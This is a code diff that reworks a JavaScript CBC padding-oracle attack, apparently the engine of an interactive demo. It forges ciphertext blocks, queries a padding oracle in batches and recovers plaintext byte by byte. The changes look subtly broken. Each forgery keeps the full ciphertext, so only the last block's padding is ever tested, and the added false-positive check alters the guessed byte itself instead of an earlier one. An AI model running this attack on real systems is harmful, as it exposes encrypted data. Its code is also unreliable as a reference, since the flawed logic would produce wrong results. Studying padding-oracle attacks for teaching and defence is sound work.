@@ -1,4 +1,4 @@
-import { splitBlocks, bytesToBase64 } from "./blocks";
+import { splitBlocks, bytesToBase64, base64ToBytes } from "./blocks";
 
 export async function runPaddingAttack(
   cipher,
@@ -7,6 +7,7 @@ export async function runPaddingAttack(
   speed = 0,
   fastMode = true
 ) {
+  const originalBytes = base64ToBytes(cipher);
   const blocks = splitBlocks(cipher);
 
   let plaintextBytes = [];
@@ -16,9 +17,6 @@ export async function runPaddingAttack(
   const BATCH = 16;
 
   for (let b = blocks.length - 1; b > 0; b--) {
-    const curr = blocks[b];
-    const prev = blocks[b - 1];
-
     let intermediate = new Uint8Array(16);
     let recovered = new Uint8Array(16);
 
@@ -31,17 +29,17 @@ export async function runPaddingAttack(
         const promises = [];
 
         for (let guess = k; guess < k + BATCH; guess++) {
-          let modified = new Uint8Array(prev);
+          const forged = new Uint8Array(originalBytes);
+
+          // modify previous block
+          const offset = (b - 1) * 16;
 
           for (let j = 15; j > i; j--) {
-            modified[j] = intermediate[j] ^ pad;
+            forged[offset + j] =
+              intermediate[j] ^ pad;
           }
 
-          modified[i] = guess;
-
-          const forged = new Uint8Array(32);
-          forged.set(modified, 0);
-          forged.set(curr, 16);
+          forged[offset + i] = guess;
 
           const payload = bytesToBase64(forged);
 
@@ -55,36 +53,39 @@ export async function runPaddingAttack(
 
         const results = await Promise.all(promises);
 
-        const valid = results.find(
-          (r) => r.res.status === "valid"
-        );
+        for (const r of results) {
+          if (r.res.status !== "valid") continue;
 
-        // throttled UI updates
-        if (!fastMode || k % 32 === 0) {
-          onUpdate({
-            block: b,
-            byte: i,
-            guesses: results.map((r) => r.guess),
-            statusBatch: results.map((r) => r.res.status),
-          });
-        }
+          // ---- FALSE POSITIVE CHECK ----
+          const forged = new Uint8Array(originalBytes);
+          const offset = (b - 1) * 16;
 
-        if (valid) {
-          const guess = valid.guess;
+          forged[offset + i] = r.guess ^ 1; // disturb padding
 
-          intermediate[i] = guess ^ pad;
-          recovered[i] = intermediate[i] ^ prev[i];
+          const test = await oracle(bytesToBase64(forged));
+
+          if (test.status === "valid") continue;
+
+          // ---- VALID BYTE ----
+          intermediate[i] = r.guess ^ pad;
+
+          const prevByte =
+            originalBytes[offset + i];
+
+          recovered[i] =
+            intermediate[i] ^ prevByte;
 
           plaintextBytes.unshift(recovered[i]);
 
           processed++;
+
           const progress =
             (processed / totalBytes) * 100;
 
           onUpdate({
             block: b,
             byte: i,
-            guess,
+            guess: r.guess,
             status: "valid",
             progress,
             recoveredText: new TextDecoder().decode(
@@ -96,6 +97,8 @@ export async function runPaddingAttack(
           break;
         }
 
+        if (found) break;
+
         if (!fastMode && speed > 0) {
           await new Promise((r) =>
             setTimeout(r, speed)
@@ -104,7 +107,6 @@ export async function runPaddingAttack(
       }
 
       if (!found) {
-        // fallback (rare)
         recovered[i] = 0;
       }
     }
